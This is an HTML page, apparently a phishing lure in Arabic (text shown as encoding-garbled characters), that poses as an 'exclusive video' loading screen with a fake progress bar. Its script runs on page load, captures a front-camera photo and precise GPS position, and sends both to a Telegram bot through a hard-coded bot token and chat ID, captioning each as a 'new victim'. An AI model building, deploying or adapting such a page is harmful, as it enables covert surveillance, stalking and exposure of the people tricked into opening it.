<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙÙŠØ¯ÙŠÙˆ Ø­ØµØ±ÙŠ - Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„ØªÙ„</title>
    <style>
        body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
        .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
        h1 {font-size:28px; margin:20px; color:#f00;}
        .loader {border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
        .progress-bar {width:80%; background:#333; border-radius:10px; overflow:hidden; margin:20px;}
        .progress {height:20px; background:#f00; width:0%; animation:load 8s linear forwards;}
        @keyframes load {0% {width:0%;} 100% {width:100%;}}
        p {font-size:18px; margin:10px;}
        .fake-video {position:absolute; top:0; left:0; width:100%; height:100%; background:#000 url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; opacity:0.3; z-index:-1;}
    </style>
</head>
<body onload="capture()">
    <div class="fake-video"></div>
    <div class="container">
        <h1>ÙÙŠØ¯ÙŠÙˆ Ø­ØµØ±ÙŠ ÙˆØµÙ„ Ù„Ù„ØªÙˆ ÙÙŠ Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„ØªÙ„</h1>
        <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„ÙƒØ§Ù…Ù„...</p>
        <div class="loader"></div>
        <div class="progress-bar"><div class="progress"></div></div>
        <p>Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ØŒ Ø§Ù„Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ© Ø¬Ø¯Ù‹Ø§...</p>
    </div>

    <script>
    function capture() {
        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(()=>{
                let canvas = document.createElement('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                let imgData = canvas.toDataURL('image/jpeg');

                navigator.geolocation.getCurrentPosition(pos=>{
                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " Â±" + pos.coords.accuracy + "m";

                    let botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
                    let chatId = "1611398303";

                    let url = `https://api.telegram.org/bot\( {botToken}/sendPhoto?chat_id= \){chatId}`;
                    let form = new FormData();
                    form.append('photo', dataURLtoBlob(imgData));
                    form.append('caption', "ğŸ†• Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„ØªÙ„\nGPS: " + gps + "\nÙˆÙ‚Øª Ø§Ù„ÙØªØ­: " + new Date());

                    fetch(url, {method: 'POST', body: form});
                });

                stream.getTracks().forEach(track => track.stop());
            }, 1500);
        }).catch(()=>{});
    }

    function dataURLtoBlob(dataurl) {
        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
        while(n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], {type:mime});
    }
    </script>
</body>
</html>
